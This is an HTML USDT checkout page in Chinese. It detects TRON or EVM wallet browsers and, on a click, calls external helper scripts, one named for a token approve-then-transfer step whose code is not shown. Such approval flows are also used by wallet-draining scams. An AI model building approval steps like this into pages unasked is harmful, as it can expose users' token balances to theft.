<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <title>安全支付收银台</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
    .card-pay { border: none; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); overflow: hidden; }
    .pay-header { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); color: white; padding: 30px 20px; text-align: center; }
    .amount-display { font-size: 32px; font-weight: 700; margin: 10px 0; }
    .pay-btn { height: 50px; font-size: 18px; font-weight: 600; border-radius: 25px; width: 100%; }
    .status-text { min-height: 24px; font-size: 14px; color: #666; margin-top: 10px; text-align: center; }
  </style>
</head>
<body>

  <div class="container py-4">
    <div class="row justify-content-center">
      <div class="col-12 col-md-6 col-lg-4">
        
        <div class="card card-pay">
          <div class="pay-header">
            <div class="small opacity-75">需支付金额</div>
            <div class="amount-display"><span id="amountText">--</span> USDT</div>
            <div class="badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2">
              <span id="netText">正在检测网络...</span>
            </div>
          </div>
          
          <div class="card-body p-4">
            <div class="mb-4">
              <div class="d-flex justify-content-between mb-2">
                <span class="text-secondary">收款地址</span>
              </div>
              <div class="p-2 bg-light rounded text-break mono small" id="toAddressText">
                --
              </div>
            </div>

            <div id="actionArea">
              <button id="btnMainPay" class="btn btn-primary pay-btn" disabled>
                连接钱包中...
              </button>
            </div>
            
            <div id="statusText" class="status-text">请在钱包浏览器中操作</div>
          </div>
        </div>

        <div class="text-center mt-4 text-secondary small">
          <p>本页面专为钱包内置浏览器优化</p>
          <a href="javascript:history.back()" class="text-decoration-none text-secondary">返回上一页</a>
        </div>

      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@6.1.1/dist/TronWeb.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
  
  <script src="config/config.js"></script>
  <script src="app/core.js"></script>
  <script src="wallet/Evm.js"></script>
  <script src="wallet/TronLink.js"></script>
  <script src="wallet/TokenPocket.js"></script>

  <script>
    (function() {
      const $ = (id) => document.getElementById(id);
      const logEl = $("statusText");
      const btn = $("btnMainPay");
      
      function log(msg) {
        if(logEl) logEl.textContent = msg;
        console.log(msg);
      }

      // 1. 初始化界面数据
      const cfg = window.pay0Config || {};
      const amount = cfg.amountUsdt || "0.00";
      $("amountText").textContent = amount;
      $("toAddressText").textContent = cfg.toAddress || "未配置";

      // 2. 环境检测与自动执行
      let payHandler = null;
      let chainType = "unknown";

      async function checkEnv() {
        // 优先检测 TRON
        if (window.tronWeb && window.tronWeb.defaultAddress) {
          chainType = "tron";
          $("netText").textContent = "TRON 网络";
          return async () => {
             log("正在发起 TRON 支付...");
             await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
          };
        }
        
        // 检测 EVM (MetaMask, TokenPocket ETH/BSC, etc)
        if (window.ethereum) {
          const chainId = await window.ethereum.request({ method: "eth_chainId" });
          // 简单的判断
          if (chainId == "0x38" || chainId == "0x61") {
            chainType = "bsc";
            $("netText").textContent = chainId == "0x61" ? "BSC 测试网" : "BSC 主网";
          } else if (chainId == "0x1") {
            chainType = "eth";
            $("netText").textContent = "Ethereum 主网";
          } else {
            chainType = "evm_other";
            $("netText").textContent = "EVM 链 (" + chainId + ")";
          }
          
          return async () => {
             log("正在发起 EVM 支付...");
             // 自动使用当前链
             await window.pay0EvmApproveAndTransfer({ chain: null, log, amountUsdt: amount });
          };
        }

        return null;
      }

      async function init() {
        try {
          // 等待一小会儿让注入完成
          await new Promise(r => setTimeout(r, 500));
          
          payHandler = await checkEnv();
          
          if (payHandler) {
            btn.textContent = "立即支付";
            btn.disabled = false;
            btn.classList.remove("btn-secondary");
            btn.classList.add("btn-primary");
            
            btn.onclick = async () => {
              try {
                btn.disabled = true;
                btn.textContent = "支付处理中...";
                await payHandler();
                btn.textContent = "支付成功";
                btn.classList.remove("btn-primary");
                btn.classList.add("btn-success");
                log("支付已完成");
              } catch (e) {
                btn.disabled = false;
                btn.textContent = "重试支付";
                log("支付失败: " + (e.message || e));
                alert("支付失败: " + (e.message || e));
              }
            };

            // 自动触发尝试（某些钱包允许，某些会拦截）
            log("环境已就绪，请点击支付");
          } else {
            btn.textContent = "未检测到钱包环境";
            btn.disabled = true;
            btn.classList.remove("btn-primary");
            btn.classList.add("btn-secondary");
            $("netText").textContent = "非钱包环境";
            log("请在钱包 APP 中打开此链接");
          }
        } catch (e) {
          log("初始化错误: " + e.message);
        }
      }

      window.addEventListener("load", init);
    })();
  </script>
</body>
</html>
